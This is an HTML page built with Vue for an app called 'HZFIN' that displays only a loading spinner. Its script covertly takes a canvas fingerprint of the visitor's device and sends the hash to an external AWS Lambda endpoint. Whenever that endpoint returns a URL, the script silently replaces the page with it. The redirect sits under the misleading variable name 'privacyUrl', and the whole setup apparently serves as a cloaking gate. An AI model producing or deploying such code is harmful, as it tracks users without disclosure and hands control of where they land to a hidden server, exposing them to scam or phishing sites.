<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>HZFIN</title>
    <!-- Vue 3 Global Production Build -->
    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
    <!-- Vue Router 4 Global Build -->
    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
    <!-- js-md5 -->
    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
    <style>
        /*
          Style 3: Minimalist Design (极简主义设计)
          - Ultra-clean aesthetic, generous whitespace, sharp borders, high contrast, subtle typography.
        */
        :root {
            --bg-color: #ffffff;
            --surface-color: #fafafa;
            --text-color: #111111;
            --text-secondary: #666666;
            --border-color: #e5e5e5;
            --primary-color: #000000;
            --primary-text: #ffffff;
            --radius: 0px;
            --shadow: none;
            --safe-bottom: env(safe-area-inset-bottom, 20px);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-size: 14px;
            line-height: 1.5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        #app {
            width: 100%;
            max-width: 480px;
            height: 100vh;
            max-height: 100vh;
            background-color: var(--bg-color);
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }

        @media (min-width: 481px) {
            #app {
                height: 844px;
                border: 1px solid var(--border-color);
                box-shadow: 0 20px 40px rgba(0,0,0,0.08);
            }
        }

        .page-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
            position: relative;
            background-color: var(--bg-color);
        }

        /* Loading & Home Page Specific Styles */
        .loading-wrapper, .home-wrapper {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 24px;
            text-align: center;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 3px solid var(--border-color);
            border-top-color: var(--primary-color);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 15px;
            letter-spacing: 2px;
            color: var(--text-secondary);
            text-transform: uppercase;
        }

        .device-hash-box {
            margin-top: auto;
            padding: 16px;
            width: 100%;
            background-color: var(--surface-color);
            border-top: 1px solid var(--border-color);
            font-family: monospace;
            font-size: 12px;
            color: var(--text-secondary);
            word-break: break-all;
            text-align: center;
        }
    </style>
</head>
<body>
    <div id="app">
        <router-view></router-view>
    </div>

    <script>
        /*
          HOW TO ADD A NEW PAGE:
          1. Create the component template / definition below.
          2. Register the new route in the `routes` array in the router configuration.
          3. Add a corresponding navigation link/tab if required by the page flow.
        */

        const { createApp, ref, onMounted } = Vue;
        const { createRouter, createWebHashHistory, useRouter } = VueRouter;

        // --- SECTION: Loading Component ---
        const LoadingPage = {
            template: `
                <div class="page-container">
                    <div class="loading-wrapper">
                        <div class="spinner"></div>
                        <div class="loading-text">Loading</div>
                    </div>
                </div>
            `,
            setup() {
                const router = useRouter();

                // 1.2 Device fingerprint using canvas and md5 (exact required block)
                const device = ref((function () {
                    try {
                        let canvas = document.createElement("canvas");
                        let ctx = canvas.getContext("2d");
                        let txt = "BrowserLeaks,com <canvas> 1.0";
                        ctx.textBaseline = "top";
                        ctx.font = "14px 'Arial'";
                        ctx.textBaseline = "alphabetic";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        ctx.fillStyle = "#069";
                        ctx.fillText(txt, 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText(txt, 4, 17);
                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
                    } catch (e) {
                        return '';
                    }
                })());

                onMounted(() => {
                    const apiBase = 'https://fnboean7coep2zj34irwh2qz740gpexh.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
                    const identifier = "garfa.aewf.avwefw";

                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
                        .then(r => r.json())
                        .then(function (info) {
                            const privacyUrl = info && info.result && info.result.url;
                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                                window.location.replace(privacyUrl);
                                return;
                            }
                            router.replace({ name: 'Home', query: { device: device.value } });
                        })
                        .catch(function () {
                            router.replace({ name: 'Home', query: { device: device.value } });
                        });
                });

                return {};
            }
        };

        // --- SECTION: Home Component ---
        const HomePage = {
            template: `
                <div class="page-container">
                    <div class="home-wrapper">
                        <div class="spinner"></div>
                        <div class="loading-text">Loading</div>
                    </div>
                    <div class="device-hash-box">
                        {{ deviceHash }}
                    </div>
                </div>
            `,
            setup() {
                const router = useRouter();
                const deviceHash = ref(router.currentRoute.value.query.device || 'Initializing device fingerprint...');

                return {
                    deviceHash
                };
            }
        };

        // --- SECTION: Router Configuration ---
        const routes = [
            {
                path: '/',
                name: 'Loading',
                component: LoadingPage
            },
            {
                path: '/home',
                name: 'Home',
                component: HomePage
            }
        ];

        const router = createRouter({
            history: createWebHashHistory(),
            routes
        });

        // --- SECTION: Root App Initialization ---
        const app = createApp({});
        app.use(router);
        app.mount('#app');
    </script>
</body>
</html>
